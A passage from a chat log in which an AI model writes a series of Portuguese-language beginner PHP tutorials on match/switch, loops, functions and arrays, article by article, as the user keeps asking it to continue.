    3       => "Reprovado",
    4, 5    => "Em análise",   // múltiplos valores por braço
    default => "Desconhecido", // default é obrigatório se não cobrir todos os casos
};

echo $descricao; // Aprovado
```

Veja a diferença de comportamento entre `switch` e `match` com tipos:

```php
<?php

$valor = "1"; // string "1"

// switch usa == — coerção de tipos
switch ($valor) {
    case 1:
        echo "switch: encontrou!"; // EXECUTA — "1" == 1 após coerção
        break;
}

// match usa === — sem coerção
$resultado = match($valor) {
    1       => "match: encontrou inteiro",
    "1"     => "match: encontrou string", // RETORNA ESTE
    default => "match: não encontrou",
};

echo $resultado; // match: encontrou string
```

---

## match com condições complexas

O `match` também aceita expressões booleanas, tornando-o uma alternativa elegante ao `if/elseif` em muitos casos:

```php
<?php

$temperatura = 32;

// match com true como sujeito — avalia expressões booleanas
$clima = match(true) {
    $temperatura >= 35           => "Muito quente",
    $temperatura >= 28           => "Quente",          // este será retornado
    $temperatura >= 20           => "Agradável",
    $temperatura >= 10           => "Frio",
    default                      => "Muito frio",
};

echo $clima; // Quente
```

```php
<?php

// Exemplo prático: classificação HTTP de status codes
$httpStatus = 404;

$categoria = match(true) {
    $httpStatus >= 500 => "Erro do servidor",
    $httpStatus >= 400 => "Erro do cliente",  // este será retornado
    $httpStatus >= 300 => "Redirecionamento",
    $httpStatus >= 200 => "Sucesso",
    default            => "Informativo",
};

echo $categoria; // Erro do cliente
```

---

## Sintaxe alternativa para templates

Quando você mistura PHP com HTML em arquivos de template, o PHP oferece uma sintaxe alternativa para estruturas de controle que é muito mais limpa do que abrir e fechar blocos com chaves:

```php
<?php $usuarioLogado = true; $nome = "Ana"; ?>

<!-- Sintaxe alternativa: if: ... endif; -->
<?php if ($usuarioLogado): ?>
    <header>
        <p>Bem-vinda, <?= $nome ?>!</p>
    </header>
<?php else: ?>
    <header>
        <a href="/login">Fazer login</a>
    </header>
<?php endif; ?>
```

Essa sintaxe com `:` e `endif` é padrão em frameworks como Laravel (nos arquivos Blade) e em qualquer template PHP tradicional. Muito mais legível do que:

```php
<?php if ($usuarioLogado) { ?>
    <p>Bem-vinda!</p>
<?php } else { ?>
    <a href="/login">Login</a>
<?php } ?>
```

---

## Boas práticas em estruturas de controle

**Sempre use chaves**, mesmo para blocos de uma linha. Omitir chaves é uma das causas mais comuns de bugs introduzidos durante manutenção de código.

**Prefira `match` ao `switch`** em PHP 8. Comparação estrita, sem `break`, e falha explícita são vantagens que eliminam toda uma categoria de bugs.

**Condições negativas são mais difíceis de ler.** Sempre que possível, prefira a afirmativa:

```php
<?php

// Difícil de ler — dupla negação
if (!$usuario->naoEstaAtivo()) { ... }

// Claro e direto
if ($usuario->estaAtivo()) { ... }
```

**Extraia condições complexas para variáveis com nome.** Isso transforma lógica em documentação:

```php
<?php

// Difícil de entender à primeira leitura
if ($usuario->idade >= 18 && $usuario->documentoVerificado && $plano->estaAtivo() && !$conta->estaBloqueada()) {
    // ...
}

// Com variável nomeada — lê-se como prosa
$podeAcessar = $usuario->idade >= 18
    && $usuario->documentoVerificado
    && $plano->estaAtivo()
    && !$conta->estaBloqueada();

if ($podeAcessar) {
    // ...
}
```

---

## Resumo

| Estrutura | Quando usar |
|---|---|
| `if / else` | Condição única ou poucas ramificações |
| `elseif` | Múltiplas condições encadeadas na mesma variável |
| `switch` | Múltiplos valores — apenas em projetos pré-PHP 8 |
| `match` | Substituto moderno do `switch` — sempre prefira em PHP 8+ |
| `match(true)` | Alternativa elegante ao `if/elseif` com expressões |
| Sintaxe alternativa | Templates PHP com HTML — use `if:` / `endif;` |

---

## Referências e leituras para aprofundar

- **Estruturas de controle — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.control-structures.php
  Documentação completa de todas as estruturas de controle, incluindo detalhes de comportamento e exemplos.

- **match — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/control-structures.match.php
  Documentação específica do `match`, com comparação detalhada com `switch` e todos os comportamentos do operador.

- **RFC: Match expression v2 — PHP 8**
  https://wiki.php.net/rfc/match_expression_v2
  A proposta formal que introduziu o `match` no PHP 8. Explica detalhadamente os problemas do `switch` que o `match` resolve.

- **Replace Conditional with Polymorphism — Martin Fowler**
  https://refactoring.guru/replace-conditional-with-polymorphism
  Padrão de refatoração que elimina `if/else` extensos substituindo-os por polimorfismo. Relevante já neste módulo para cultivar o pensamento correto.

- **MARTIN, Robert C.** *Clean Code: A Handbook of Agile Software Craftsmanship*. Prentice Hall, 2008.
  https://www.oreilly.com/library/view/clean-code-a/9780136083238/
  Capítulos 3 e 4 abordam funções pequenas e comentários — diretamente relacionados à legibilidade de estruturas condicionais.

- **PHP: The Right Way — Boas práticas gerais**
  https://phptherightway.com
  Guia colaborativo com práticas modernas para toda a série.

---

**No próximo artigo:** Estruturas de repetição — `for`, `foreach`, `while`, `do while` e como evitar loops infinitos.

---

Gerando o HTML agora.

Artigo 05 entregue — texto acima e HTML aqui.

**Destaques deste artigo:**
- **Grade de comparação lado a lado** — `switch` vs `match` e chaves vs sintaxe alternativa de template
- Cobertura completa de `match(true)` para expressões booleanas com exemplos práticos reais (temperatura, HTTP status codes)
- Box vermelho de perigo para a armadilha do `switch` sem `break`
- Desafio de refatoração no exercício final integrando os conceitos anteriores

Diga **"Continue"** para o Artigo 06 — *Estruturas de Repetição: for, foreach, while e do while*.

---

# you asked

message time: 2026-03-06 03:33:57

Continue

---

# claude response

# Artigo 06 — Estruturas de Repetição

**Módulo 1 · Semana 6 · Nível: Iniciante**

---

## Introdução

Se as estruturas de controle ensinam o programa a tomar decisões, as estruturas de repetição ensinam o programa a ter persistência. Repetir uma ação dez, cem ou um milhão de vezes sem escrever o código uma única vez extra — isso é o poder dos loops.

O PHP oferece quatro estruturas de repetição: `for`, `foreach`, `while` e `do while`. Cada uma tem um contexto onde brilha. Entender qual usar em cada situação é uma das marcas de um desenvolvedor experiente.

---

## for

O `for` é ideal quando você sabe de antemão quantas vezes quer repetir algo. Sua estrutura tem três partes: inicialização, condição de continuação e incremento.

```php
<?php

// Estrutura: for (inicialização; condição; incremento)
// 1. Inicialização: executada UMA vez, no início
// 2. Condição: verificada ANTES de cada iteração — se false, para
// 3. Incremento: executado APÓS cada iteração

for ($i = 0; $i < 5; $i++) {
    echo "Iteração $i\n";
}
// Saída: Iteração 0, Iteração 1, Iteração 2, Iteração 3, Iteração 4

// Contando de trás para frente
for ($i = 5; $i > 0; $i--) {
    echo "$i ";
}
// Saída: 5 4 3 2 1

// Incremento de dois em dois
for ($i = 0; $i <= 10; $i += 2) {
    echo "$i "; // 0 2 4 6 8 10
}

// Iterando sobre um array com índice numérico
$frutas = ["maçã", "banana", "laranja", "uva"];

for ($i = 0; $i < count($frutas); $i++) {
    // count() retorna o número de elementos do array
    echo "$i: {$frutas[$i]}\n";
}
// 0: maçã
// 1: banana
// 2: laranja
// 3: uva
```

---

## foreach

O `foreach` é a estrutura de repetição mais usada no PHP cotidiano. Ele foi feito especificamente para iterar sobre arrays e objetos, sem a necessidade de controlar um índice manualmente.

```php
<?php

$frutas = ["maçã", "banana", "laranja", "uva"];

// Forma simples — acessa apenas o valor
foreach ($frutas as $fruta) {
    echo $fruta . "\n";
}

// Forma com chave e valor — acessa índice e valor
foreach ($frutas as $indice => $fruta) {
    echo "$indice: $fruta\n";
}
// 0: maçã
// 1: banana
// 2: laranja
// 3: uva

// foreach com array associativo (chave => valor)
$pessoa = [
    "nome"  => "Ana",
    "idade" => 28,
    "cidade" => "São Paulo",
];

foreach ($pessoa as $chave => $valor) {
    echo "$chave: $valor\n";
}
// nome: Ana
// idade: 28
// cidade: São Paulo

// foreach com array de arrays — muito comum em dados de banco
$usuarios = [
    ["nome" => "Ana",    "idade" => 28],
    ["nome" => "Carlos", "idade" => 35],
    ["nome" => "Beatriz","idade" => 22],
];

foreach ($usuarios as $usuario) {
    // Cada $usuario é um array associativo
    echo "{$usuario['nome']} tem {$usuario['idade']} anos.\n";
}
```

---

## Modificando valores com foreach por referência

Por padrão, o `foreach` trabalha com uma **cópia** do valor. Se você precisar modificar os elementos originais do array durante a iteração, use o operador `&` para passar por referência:

```php
<?php

$precos = [10.0, 25.5, 8.0, 42.0];

// Sem referência — $preco é uma cópia, o array original não muda
foreach ($precos as $preco) {
    $preco *= 1.1; // aplica 10% de aumento — mas não salva!
}
var_dump($precos[0]); // float(10) — não mudou

// Com referência (&) — modifica o array original
foreach ($precos as &$preco) {
    $preco *= 1.1; // agora salva no array original
}
unset($preco); // IMPORTANTE: sempre destrua a referência após o loop
               // Sem isso, a variável $preco ainda aponta para o último elemento
               // e pode causar bugs sutis se o array for reutilizado

var_dump($precos[0]); // float(11) — mudou corretamente
```

O `unset($preco)` após o loop é uma das armadilhas mais clássicas do PHP. Nunca se esqueça dele ao usar referências em `foreach`.

---

## while

O `while` repete enquanto uma condição for verdadeira. É ideal quando você não sabe de antemão quantas iterações serão necessárias — o loop termina quando a condição se torna falsa.

```php
<?php

// Estrutura básica
$contador = 0;

while ($contador < 5) {
    echo "Contador: $contador\n";
    $contador++; // sem isso, loop infinito!
}

// Exemplo prático: lendo um arquivo linha por linha
// fgets() retorna false quando chega ao fim do arquivo
$arquivo = fopen("dados.txt", "r");

if ($arquivo) {
    while (($linha = fgets($arquivo)) !== false) {
        // processa cada linha
        echo trim($linha) . "\n";
    }
    fclose($arquivo);
}

// Simulando paginação — avança páginas enquanto houver resultados
$pagina  = 1;
$porPagina = 10;
$totalRegistros = 47;

while (($pagina - 1) * $porPagina < $totalRegistros) {
    $inicio = ($pagina - 1) * $porPagina + 1;
    $fim    = min($pagina * $porPagina, $totalRegistros);
    echo "Processando registros $inicio a $fim\n";
    $pagina++;
}
// Processando registros 1 a 10
// Processando registros 11 a 20
// Processando registros 21 a 30
// Processando registros 31 a 40
// Processando registros 41 a 47
```

---

## do while

O `do while` é semelhante ao `while`, mas com uma diferença fundamental: o bloco de código é executado **pelo menos uma vez** antes de verificar a condição. Isso é útil quando você precisa que o código rode ao menos uma iteração independentemente da condição.

```php
<?php

// do while garante ao menos uma execução
$tentativas = 0;

do {
    echo "Tentativa $tentativas\n";
    $tentativas++;
} while ($tentativas < 3);
// Tentativa 0
// Tentativa 1
// Tentativa 2

// Caso clássico: validação de entrada do usuário
// (em ambiente CLI — linha de comando)
do {
    $entrada = readline("Digite um número entre 1 e 10: ");
    $numero  = (int) $entrada;
} while ($numero < 1 || $numero > 10);

echo "Você digitou: $numero";

// Processamento com retry — tenta operação até ter sucesso ou esgotar tentativas
$maxTentativas = 3;
$tentativa     = 0;
$sucesso       = false;

do {
    $tentativa++;
    // simula uma operação que pode falhar
    $sucesso = rand(0, 1) === 1;
    echo "Tentativa $tentativa: " . ($sucesso ? "sucesso" : "falhou") . "\n";
} while (!$sucesso && $tentativa < $maxTentativas);
```

---

## break e continue

Dois comandos que controlam o fluxo dentro de loops:

- `break` — interrompe o loop completamente
- `continue` — pula para a próxima iteração, ignorando o restante do bloco atual

```php
<?php

$numeros = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

// break — para o loop quando encontra o primeiro número maior que 5
foreach ($numeros as $n) {
    if ($n > 5) {
        break; // sai do foreach completamente
    }
    echo "$n "; // 1 2 3 4 5
}

// continue — pula os números pares
foreach ($numeros as $n) {
    if ($n % 2 === 0) {
        continue; // vai para a próxima iteração
    }
    echo "$n "; // 1 3 5 7 9
}

// break com nível numérico — quebra loops aninhados
// break 2 sai de dois níveis de loop de uma vez
for ($i = 0; $i < 3; $i++) {
    for ($j = 0; $j < 3; $j++) {
        if ($i === 1 && $j === 1) {
            break 2; // sai dos dois loops
        }
        echo "($i,$j) ";
    }
}
// (0,0) (0,1) (0,2) (1,0)
```

---

## Evitando loops infinitos

Um loop infinito trava o processo PHP e pode derrubar o servidor. As causas mais comuns são:

```php
<?php

// ✗ LOOP INFINITO — condição nunca se torna false
$i = 0;
while ($i < 10) {
    echo $i;
    // esquecemos de incrementar $i!
}

// ✗ LOOP INFINITO — incremento errado
for ($i = 10; $i > 0; $i++) { // $i começa em 10 e só aumenta
    echo $i;
}

// ✓ Sempre verifique:
// 1. A variável de controle está sendo modificada dentro do loop?
// 2. A condição de parada é realmente atingível?
// 3. Há algum caso extremo (array vazio, valor zero) que precisa ser tratado?

// Proteção com contador de segurança — útil em loops complexos
$maxIteracoes = 1000;
$iteracao     = 0;

while (condicaoComplexaDificilDeVerificar()) {
    if ($iteracao++ > $maxIteracoes) {
        throw new RuntimeException("Loop excedeu o limite de segurança.");
    }
    // processamento...
}
```

---

## Qual loop usar em cada situação

```php
<?php

$nomes = ["Ana", "Bruno", "Carla"];

// foreach — iterando arrays ou coleções (uso mais comum)
foreach ($nomes as $nome) {
    echo $nome . "\n";
}

// for — quando o índice numérico importa ou você sabe o número de iterações
for ($i = 0; $i < count($nomes); $i++) {
    echo "$i: {$nomes[$i]}\n";
}

// while — condição desconhecida, leitura de streams, retries
$posicao = 0;
while ($posicao < count($nomes)) {
    echo $nomes[$posicao] . "\n";
    $posicao++;
}

// do while — quando precisa de ao menos uma execução garantida
$tentativa = 0;
do {
    echo "Tentativa $tentativa\n";
    $tentativa++;
} while ($tentativa < 3);
```

---

## Boas práticas em loops

**Prefira `foreach` para arrays.** É mais legível, menos propenso a erros de índice e expressa melhor a intenção de "percorrer cada item".

**Evite modificar o array que está sendo iterado.** Se precisar filtrar ou transformar, prefira funções como `array_filter()` e `array_map()` — veremos no próximo módulo.

**Não chame funções pesadas na condição do `for`.** O código a seguir chama `count()` a cada iteração:

```php
<?php

// ✗ count() é chamado em cada iteração
for ($i = 0; $i < count($array); $i++) { ... }

// ✓ Calcule uma vez só, antes do loop
$total = count($array);
for ($i = 0; $i < $total; $i++) { ... }
```

**Sempre destrua referências após `foreach` com `&`.** Como vimos, `unset($variavel)` após o loop é obrigatório.

**Nomeie a variável de iteração com clareza.** `$usuario` é melhor que `$u`. `$produto` é melhor que `$p`. `$i` é aceitável apenas para contadores numéricos simples.

---

## Resumo

| Estrutura | Quando usar |
|---|---|
| `for` | Número de iterações conhecido, índice numérico importa |
| `foreach` | Iterar arrays e objetos — uso mais comum no PHP |
| `while` | Condição desconhecida, streams, operações com retry |
| `do while` | Ao menos uma execução é garantida antes de verificar |
| `break` | Interromper o loop completamente |
| `continue` | Pular para a próxima iteração |
| `break N` | Sair de N níveis de loops aninhados |

---

## Referências e leituras para aprofundar

- **Estruturas de repetição — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.control-structures.php
  Documentação completa de `for`, `foreach`, `while` e `do while` com todos os detalhes de comportamento.

- **foreach — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/control-structures.foreach.php
  Documentação específica do `foreach`, incluindo o comportamento de referências com `&` e as notas de compatibilidade.

- **array_map, array_filter, array_walk — php.net**
  https://www.php.net/manual/pt_BR/ref.array.php
  Funções funcionais que substituem loops em muitos casos. Veremos em detalhes no Módulo 2, mas vale uma espiada agora.

- **PHP: The Right Way — Arrays**
  https://phptherightway.com/#arrays
  Seção sobre arrays e boas práticas de iteração, complementando o conteúdo deste artigo.

- **HUNT, Andrew; THOMAS, David.** *The Pragmatic Programmer*. 20th Anniversary Edition. Addison-Wesley, 2019.
  https://pragprog.com/titles/tpp20/the-pragmatic-programmer-20th-anniversary-edition/
  Capítulo sobre loops e estruturas de dados — leitura que transcende qualquer linguagem específica.

- **Generators — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.generators.php
  Tema avançado para explorar depois: generators permitem iterar sobre grandes conjuntos de dados sem carregá-los todos na memória. Uma evolução natural dos loops.

---

**No próximo artigo:** Funções — criando blocos de código reutilizáveis, parâmetros, retorno de valores e escopo de variáveis.

---

Gerando o HTML agora.

Artigo 06 entregue — texto acima e HTML aqui.

**Destaques deste artigo:**
- **Cards de escolha** no topo resumindo qual loop usar em cada situação — antes mesmo de começar o conteúdo
- **Diagrama anatômico do `for`** com labels coloridos destacando inicialização, condição e incremento
- Box vermelho para a armadilha clássica do `unset()` após `foreach` com referência
- Exemplo real de paginação com `while` e retry com `do while`
- Checklist anti-loop-infinito no box verde

Diga **"Continue"** para o Artigo 07 — *Funções: parâmetros, retorno, tipagem e escopo*.

---

# you asked

message time: 2026-03-06 04:17:30

Continue

---

# claude response

# Artigo 07 — Funções

**Módulo 1 · Semana 7 · Nível: Iniciante–Intermediário**

---

## Introdução

Até agora escrevemos código sequencial — uma instrução após a outra, em um único bloco. Isso funciona para programas simples, mas rapidamente se torna um problema: código duplicado em vários lugares, dificuldade de manutenção, impossibilidade de testar partes isoladas.

Funções resolvem isso. Uma função é um bloco de código nomeado que pode ser chamado quantas vezes precisar, de qualquer lugar do programa. É o primeiro e mais fundamental mecanismo de reutilização de código em qualquer linguagem.

Neste artigo vamos cobrir tudo sobre funções no PHP moderno: definição, parâmetros, valores padrão, tipagem, retorno, escopo de variáveis, funções anônimas e arrow functions.

---

## Definindo e chamando funções

A palavra-chave `function` define uma função. O nome segue as mesmas regras das variáveis, mas sem o `$`, e a convenção é camelCase:

```php
<?php

// Definindo uma função
// A definição NÃO executa o código — apenas o registra
function saudacao(): void
{
    echo "Olá, mundo!\n";
}

// Chamando a função — agora o código executa
saudacao(); // Olá, mundo!
saudacao(); // Olá, mundo! — pode chamar quantas vezes quiser

// Funções podem ser definidas depois de onde são chamadas
// O PHP carrega todas as definições antes de executar
dizOi();

function dizOi(): void
{
    echo "Oi!\n";
}
```

---

## Parâmetros e argumentos

Parâmetros são as variáveis declaradas na definição da função. Argumentos são os valores passados na chamada. A distinção é sutil mas importante para a comunicação técnica:

```php
<?php

// $nome e $saudacao são PARÂMETROS — variáveis locais da função
function cumprimentar(string $nome, string $saudacao): void
{
    // $nome e $saudacao só existem dentro desta função
    echo "$saudacao, $nome!\n";
}

// "Ana" e "Bom dia" são ARGUMENTOS — valores passados na chamada
cumprimentar("Ana", "Bom dia");    // Bom dia, Ana!
cumprimentar("Carlos", "Boa tarde"); // Boa tarde, Carlos!
```

### Valores padrão

Parâmetros podem ter valores padrão, tornando-os opcionais na chamada. Parâmetros com padrão sempre vêm depois dos obrigatórios:

```php
<?php

// $saudacao tem um valor padrão — é opcional na chamada
function cumprimentar(string $nome, string $saudacao = "Olá"): void
{
    echo "$saudacao, $nome!\n";
}

cumprimentar("Ana");              // Olá, Ana! — usa o padrão
cumprimentar("Carlos", "Oi");     // Oi, Carlos! — substitui o padrão

// Valores padrão podem ser strings, números, arrays, null — mas não expressões dinâmicas
function criarPerfil(
    string $nome,
    int    $idade    = 0,
    array  $hobbies  = [],       // array vazio como padrão
    ?string $bio     = null      // null como padrão — ? indica que aceita null
): void {
    echo "$nome, $idade anos\n";
    echo "Hobbies: " . implode(", ", $hobbies) . "\n";
    echo "Bio: " . ($bio ?? "Sem bio") . "\n";
}

criarPerfil("Ana", 28, ["leitura", "código"]);
criarPerfil("Bruno"); // usa todos os padrões
```

### Passagem por referência

Assim como no `foreach`, você pode passar argumentos por referência usando `&`. A função então modifica a variável original, não uma cópia:

```php
<?php

// Sem referência — a função recebe uma cópia
function dobrarCopia(int $valor): void
{
    $valor *= 2; // modifica apenas a cópia local
}

// Com referência — a função modifica a variável original
function dobrarOriginal(int &$valor): void
{
    $valor *= 2; // modifica a variável original
}

$numero = 10;

dobrarCopia($numero);
echo $numero; // 10 — não mudou

dobrarOriginal($numero);
echo $numero; // 20 — mudou
```

Use passagem por referência com moderação. Na maioria dos casos, é melhor retornar o valor modificado do que modificar o original — o código fica mais previsível e testável.

---

## Retorno de valores

A instrução `return` encerra a execução da função e devolve um valor ao chamador. Uma função que não tem `return` devolve `null` implicitamente:

```php
<?php

// Retornando um valor simples
function somar(int $a, int $b): int
{
    return $a + $b; // encerra a função e retorna o resultado
}

$resultado = somar(3, 4);
echo $resultado; // 7

// Retorno antecipado — útil para casos de guarda (early return)
// Em vez de aninhar if/else, retorne cedo e mantenha o código "reto"
function calcularDesconto(float $preco, float $percentual): float
{
    // Guarda: valida as entradas antes de continuar
    if ($preco <= 0) {
        return 0.0;
    }

    if ($percentual <= 0 || $percentual > 100) {
        return $preco; // sem desconto se percentual inválido
    }

    return $preco - ($preco * $percentual / 100);
}

echo calcularDesconto(100.0, 20.0); // 80
echo calcularDesconto(-50.0, 20.0); // 0 — guarda ativada
echo calcularDesconto(100.0, 150.0); // 100 — guarda ativada

// Retornando arrays — muito comum no PHP
function obterDimensoes(float $largura, float $altura): array
{
    return [
        "largura" => $largura,
        "altura"  => $altura,
        "area"    => $largura * $altura,
    ];
}

$dims = obterDimensoes(5.0, 3.0);
echo $dims["area"]; // 15
```

---

## Tipagem de funções

O PHP moderno permite declarar os tipos dos parâmetros e do retorno. Isso torna o código mais seguro, mais legível e permite que ferramentas como IDEs e analisadores estáticos detectem erros antes de executar:

```php
<?php

// Tipos escalares nos parâmetros e no retorno
function dividir(float $dividendo, float $divisor): float
{
    if ($divisor === 0.0) {
        throw new InvalidArgumentException("Divisão por zero não é permitida.");
    }

    return $dividendo / $divisor;
}

// Union types — PHP 8: aceita mais de um tipo
function formatar(int|float $numero): string
{
    return number_format($numero, 2, ',', '.');
}

echo formatar(1234.5);   // 1.234,50
echo formatar(1000);     // 1.000,00

// Nullable types — o ? indica que o valor pode ser null
function encontrarUsuario(int $id): ?array
{
    $usuarios = [
        1 => ["nome" => "Ana",    "email" => "ana@email.com"],
        2 => ["nome" => "Carlos", "email" => "carlos@email.com"],
    ];

    // Retorna null se o usuário não existir — em vez de false ou array vazio
    return $usuarios[$id] ?? null;
}

$usuario = encontrarUsuario(1);
$ausente  = encontrarUsuario(99);

var_dump($usuario); // array com dados
var_dump($ausente); // NULL

// void — função não retorna nada
function registrarLog(string $mensagem): void
{
    echo "[LOG] $mensagem\n";
    // return; // opcional — void proíbe retornar um valor
}

// never — PHP 8.1: função que NUNCA retorna (sempre lança exceção ou encerra)
function falharComErro(string $mensagem): never
{
    throw new RuntimeException($mensagem);
    // Ou: exit(1);
}
```

### Modo estrito

Por padrão, o PHP faz coerção de tipos nos parâmetros. Com `declare(strict_types=1)`, a tipagem se torna rígida e não faz coerção — é a prática recomendada em projetos modernos:

```php
<?php
declare(strict_types=1); // deve ser a primeira linha do arquivo

function somar(int $a, int $b): int
{
    return $a + $b;
}

somar(3, 4);      // OK
somar(3.5, 4);    // TypeError em strict mode — float não é int
somar("3", 4);    // TypeError em strict mode — string não é int
```

---

## Escopo de variáveis

No PHP, variáveis definidas fora de uma função **não estão disponíveis** dentro dela por padrão. Isso é diferente de muitas outras linguagens e pega muitos iniciantes de surpresa:

```php
<?php

$mensagem = "Olá do escopo global";

function exibir(): void
{
    // $mensagem não existe aqui — PHP não herda escopo automaticamente
    echo $mensagem; // Notice: Undefined variable $mensagem
}

exibir();

// Para usar uma variável global dentro de uma função, declare com global
// (mas evite isso — é uma prática ruim que cria acoplamento oculto)
function exibirGlobal(): void
{
    global $mensagem; // agora $mensagem está acessível
    echo $mensagem;   // Olá do escopo global
}

// A forma correta: passe o valor como parâmetro
function exibirCorreto(string $mensagem): void
{
    echo $mensagem;
}

exibirCorreto($mensagem); // limpo, explícito, testável
```

### Variáveis estáticas

Uma variável estática dentro de uma função mantém seu valor entre chamadas — sem precisar de uma variável global:

```php
<?php

function contarChamadas(): int
{
    // static faz a variável persistir entre chamadas da função
    // É inicializada apenas uma vez
    static $contador = 0;
    $contador++;
    return $contador;
}

echo contarChamadas(); // 1
echo contarChamadas(); // 2
echo contarChamadas(); // 3
```

---

## Funções anônimas (closures)

Funções anônimas não têm nome e podem ser atribuídas a variáveis, passadas como argumentos ou retornadas por outras funções. São fundamentais para programação funcional em PHP:

```php
<?php

// Função anônima atribuída a uma variável
$dobrar = function(int $n): int {
    return $n * 2;
};

echo $dobrar(5); // 10

// Passando função anônima como argumento
// array_map aplica a função a cada elemento do array
$numeros = [1, 2, 3, 4, 5];

$dobrados = array_map(function(int $n): int {
    return $n * 2;
}, $numeros);

print_r($dobrados); // [2, 4, 6, 8, 10]

// use — captura variáveis do escopo externo dentro da closure
$fator = 3;

$multiplicar = function(int $n) use ($fator): int {
    // $fator foi capturado do escopo externo via use
    return $n * $fator;
};

echo $multiplicar(5); // 15

// use por referência — captura e permite modificar a variável externa
$total = 0;

$acumular = function(int $n) use (&$total): void {
    $total += $n; // modifica o $total externo
};

$acumular(10);
$acumular(20);
echo $total; // 30
```

---

## Arrow functions

Introduzidas no PHP 7.4, as arrow functions são uma sintaxe compacta para funções anônimas de uma única expressão. Elas capturam variáveis do escopo externo automaticamente — sem precisar de `use`:

```php
<?php

// Função anônima tradicional
$dobrar = function(int $n): int {
    return $n * 2;
};

// Arrow function equivalente — muito mais concisa
$dobrar = fn(int $n): int => $n * 2;

echo $dobrar(5); // 10

// Arrow function captura o escopo externo automaticamente
$fator = 3;
$multiplicar = fn(int $n): int => $n * $fator; // $fator capturado automaticamente

echo $multiplicar(5); // 15

// Uso prático com array_map e array_filter
$numeros = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

// Filtra apenas os pares
$pares = array_filter($numeros, fn(int $n): bool => $n % 2 === 0);

// Dobra cada valor
$dobrados = array_map(fn(int $n): int => $n * 2, $numeros);

// Encadeando — filtra pares e dobra
$paresDobrados = array_map(
    fn(int $n): int => $n * 2,
    array_filter($numeros, fn(int $n): bool => $n % 2 === 0)
);

print_r($paresDobrados); // [4, 8, 12, 16, 20]
```

---

## Boas práticas em funções

**Uma função deve fazer uma coisa só.** Se você precisar de "e" para descrever o que a função faz, ela provavelmente deveria ser dividida em duas.

**Nomeie funções com verbos.** `calcularTotal()`, `buscarUsuario()`, `validarEmail()` — o nome deve descrever a ação, não o dado.

**Prefira early return** ao invés de `if/else` aninhados. O código fica mais linear e fácil de ler.

**Limite os parâmetros.** Funções com mais de três ou quatro parâmetros geralmente indicam que a função faz coisas demais ou que os parâmetros deveriam ser agrupados em um array ou objeto.

**Use `declare(strict_types=1)`** em todos os seus arquivos PHP. Isso transforma erros de tipo em exceções explícitas, em vez de conversões silenciosas que geram bugs difíceis de encontrar.

```php
<?php
declare(strict_types=1);

// ✗ Função que faz coisas demais
function processarPedido(array $itens, string $email, string $endereco, float $frete): void
{
    // calcula total, envia email, salva no banco, gera nota fiscal...
}

// ✓ Responsabilidades separadas
function calcularTotalPedido(array $itens, float $frete): float
{
    $subtotal = array_sum(array_column($itens, "preco"));
    return $subtotal + $frete;
}

function enviarConfirmacao(string $email, float $total): void
{
    // envia e-mail de confirmação
}
```

---

## Resumo

| Conceito | O que aprendemos |
|---|---|
| `function` | Define um bloco reutilizável com nome |
| Parâmetros | Variáveis locais da função; argumentos são os valores passados |
| Valores padrão | Tornam parâmetros opcionais; sempre após os obrigatórios |
| Passagem por `&` | Modifica a variável original — use com moderação |
| `return` | Encerra a função e devolve um valor |
| Early return | Retorne cedo para evitar aninhamento — guarda de validação |
| Tipagem | Declare tipos em parâmetros e retorno; use `strict_types=1` |
| Escopo | Variáveis externas não entram na função — passe como parâmetro |
| `static` | Variável que persiste entre chamadas da mesma função |
| Closure | Função anônima; usa `use` para capturar escopo externo |
| Arrow function | `fn() =>` — compacta, captura escopo automaticamente |

---

## Referências e leituras para aprofundar

- **Funções — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.functions.php
  Documentação completa sobre funções, incluindo funções variádicas, named arguments e todos os detalhes de comportamento.

- **Funções anônimas (Closures) — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/functions.anonymous.php
  Documentação específica sobre closures e o uso de `use` para captura de escopo.

- **Arrow functions — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/functions.arrow.php
  Documentação das arrow functions introduzidas no PHP 7.4, com exemplos e comparação com closures.

- **RFC: Arrow functions 2.0**
  https://wiki.php.net/rfc/arrow_functions_v2
  A proposta formal das arrow functions. Explica a motivação, o design e as limitações (apenas uma expressão, sem corpo de bloco).

- **declare(strict_types) — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/language.types.declarations.php#language.types.declarations.strict
  Como e por que usar o modo estrito de tipos. Fundamental para projetos PHP modernos.

- **MARTIN, Robert C.** *Clean Code*. Prentice Hall, 2008. Capítulo 3: Functions.
  https://www.oreilly.com/library/view/clean-code-a/9780136083238/
  O capítulo mais importante do livro. Trata de tamanho de funções, nomes, parâmetros e o princípio da responsabilidade única aplicado a funções.

---

**No próximo artigo:** Arrays em profundidade — criação, manipulação, funções nativas e arrays multidimensionais.

---

Gerando o HTML agora.

---

# claude response

# Artigo 08 — Arrays em Profundidade

**Módulo 1 · Semana 8 · Nível: Iniciante–Intermediário**

---

## Introdução

Arrays são a estrutura de dados mais usada no PHP. Praticamente tudo que você fará com o PHP — ler dados de um banco, processar um formulário, construir uma resposta de API — vai envolver arrays de alguma forma. Entender arrays com profundidade não é opcional: é o que separa quem apenas usa PHP de quem realmente o domina.

Neste artigo vamos cobrir criação, acesso, modificação, arrays associativos, multidimensionais e o conjunto de funções nativas que tornam os arrays do PHP tão poderosos.

---

## Criando arrays

O PHP suporta duas sintaxes para criar arrays. A sintaxe com colchetes `[]` é a moderna e preferida:

```php
<?php
declare(strict_types=1);

// Sintaxe moderna — preferida desde PHP 5.4
$frutas = ["maçã", "banana", "laranja"];

// Sintaxe antiga — ainda funciona, mas evite em código novo
$frutas = array("maçã", "banana", "laranja");

// Array vazio — comum para inicializar antes de preencher
$resultado = [];

// Array com índices explícitos
// Os índices não precisam ser sequenciais
$sparse = [0 => "zero", 5 => "cinco", 10 => "dez"];

// PHP atribui o próximo índice inteiro após o maior existente
$sparse[] = "onze"; // receberá índice 11

// Verificando se é array e seu tamanho
var_dump(is_array($frutas)); // bool(true)
echo count($frutas);         // 3
echo count([]);              // 0
```

---

## Arrays associativos

